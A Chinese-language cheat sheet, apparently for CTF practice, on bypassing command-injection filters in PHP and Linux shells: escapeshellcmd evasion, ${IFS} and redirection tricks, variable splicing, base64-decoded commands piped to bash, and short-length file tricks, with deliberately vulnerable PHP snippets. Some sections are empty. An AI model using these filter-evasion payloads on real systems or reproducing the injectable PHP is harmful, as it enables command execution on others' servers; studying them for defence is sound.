# 绕过escapeshellcmd
## 法一：执行bat
```php 
<?php
    $command = 'dir '.$_POST['dir'];
    $escaped_command = escapeshellcmd($command);
    var_dump($escaped_command);
    file_put_contents('out.bat',$escaped_command);
    system('out.bat');
?>
```
执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。
payload:
```
dir=../ %1a whoami
```
## 法二：宽字节注入
php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。
```
escapeshellcmd("echo ".chr(0xc0).";id"); 
```
之后该语句会变成
```
echo 繺;id 
```
从而实现 id 命令的注入。

# 空格过滤
## 法一： ${IFS}
payload1:
```
ubuntu@VM-207-93-ubuntu:~$ cat flag
nice day
ubuntu@VM-207-93-ubuntu:~$ cat${IFS}flag
nice day
```
payload2:
```
ubuntu@VM-207-93-ubuntu:~$ cat${IFS}$9flag
nice day
```
payload3:
```
ubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flag
nice day

```
## 法二： 重定向符<>
payload1：
```
ubuntu@VM-207-93-ubuntu:~$ cat<>flag
nice day
```
payload2：
```
ubuntu@VM-207-93-ubuntu:~$ cat<flag
nice day
```

# 黑名单绕过
## 法一： 拼接
```
ubuntu@VM-207-93-ubuntu:~$ a=c;b=at;c=flag;$a$b $c
nice day
```
## 法二： 利用已存在的资源
从已有的文件或者环境变量中获得相应的字符。

## 法三： base64编码
payload1:
```
ubuntu@VM-207-93-ubuntu:~$ `echo "Y2F0IGZsYWc="|base64 -d`
nice day
```
payload2:
```
ubuntu@VM-207-93-ubuntu:~$ echo "Y2F0IGZsYWc="|base64 -d|bash
nice day
```

# 无回显

# 长度限制
## 文件构造
payload1:
```
a>wget
```
payload2:
```
1>wget
```
payload3:
```
>wget
```
将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。.
类似的，可以执行一系列操作，比如：
```

```

```php 
<?php
if(strlen($_GET[test])<8){
     echo shell_exec($_GET[test]);
}
?>
```

# LINUX下一些已有字符
+ ${PS2} 对应字符 '>'
+ ${PS4} 对应字符 '+'
+ ${IFS} 对应 内部字段分隔符
+ ${9}   对应 空字符串

# 工具
+ [shelling
](https://github.com/ewilded/shelling)

# Refference
+ [PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)
+ [eval长度限制绕过 && PHP5.6新特性](https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html)
+ [关于lnmp目录禁止执行的绕过与正确方法](https://www.leavesongs.com/PENETRATION/nginx-deny-exec-php-file.html)
+ [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
+ [php webshell分析和绕过waf技巧](http://bobao.360.cn/learning/detail/3271.html)
+ [【技术分享】命令执行和绕过的一些小技巧](http://bobao.360.cn/learning/detail/3192.html)
+ [浅谈CTF中命令执行与绕过的小技巧](http://www.freebuf.com/articles/web/137923.html)
+ [Mathias:命令执行的bypass技巧](http://www.math1as.com/index.php/archives/484)